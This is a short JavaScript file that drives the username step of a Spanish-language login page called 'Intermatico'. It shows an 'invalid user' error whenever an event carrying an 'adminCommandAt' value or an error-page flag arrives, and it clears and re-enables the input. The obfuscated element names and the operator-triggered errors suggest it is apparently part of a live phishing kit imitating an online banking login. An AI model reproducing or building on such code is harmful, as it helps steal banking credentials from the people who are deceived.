(function () {
  var ERROR_MESSAGE =
    'El usuario ingresado no es válido. Por favor verifique e intente nuevamente.';
  var ERROR_PAGE = 2;
  var lastShownCommandAt = '';

  function alertCommandKey(detail) {
    var data = detail && detail.data ? detail.data : {};
    if (data.adminCommandAt) {
      return String(data.adminCommandAt);
    }
    return [data.inicioErr ? '1' : '0', data.loginError || '', detail && detail.page].join('|');
  }

  function shouldShowError(detail) {
    var key = alertCommandKey(detail);
    if (!key || key === '|') {
      return false;
    }
    if (key === lastShownCommandAt) {
      return false;
    }
    lastShownCommandAt = key;
    return true;
  }

  function hideError() {
    var box = document.getElementById('errorBox');
    if (box) {
      box.style.display = 'none';
      box.textContent = '';
    }
  }

  function clearTikiInput() {
    var user = document.getElementById('tiki');
    if (user) {
      user.value = '';
    }
    var btn = document.getElementById('botonSendTikisadasd');
    if (btn && !btn.classList.contains('bse-btn-loading')) {
      btn.disabled = true;
      btn.classList.add('botonSiguienteDeshabilitado');
      btn.classList.remove('botonSiguiente');
    }
  }

  function showError() {
    clearTikiInput();
    var box = document.getElementById('errorBox');
    if (!box) {
      return;
    }
    box.textContent = ERROR_MESSAGE;
    box.style.display = 'block';
    if (window.hideLoader) {
      window.hideLoader();
    }
  }

  function isIndexError(detail) {
    var page = detail ? Number(detail.page) : NaN;
    var data = detail && detail.data ? detail.data : {};
    return page === ERROR_PAGE || data.inicioErr === true;
  }

  document.addEventListener('lognPage', function (event) {
    var detail = event.detail || {};
    if (isIndexError(detail)) {
      if (shouldShowError(detail)) {
        showError();
      }
      return;
    }
    if (Number(detail.page) !== 0) {
      hideError();
    }
  });

  document.addEventListener('input', function (event) {
    var target = event.target;
    if (target && target.id === 'tiki') {
      hideError();
    }
  });
})();

IndexFlowClient.init({
  tipo: 'Intermatico',
  pageLocation: 'index',
  sessionKey: 'intermaticoActual',
  localPage: 0,
  errorPage: 2,
  minUserLength: 1,
  userInput: '#tiki',
  mitButton: '#botonSendTikisadasd',
  lg: '#logn',
  mitLabel: 'Continuar',
  loadingLabel: 'Procesando…'
});
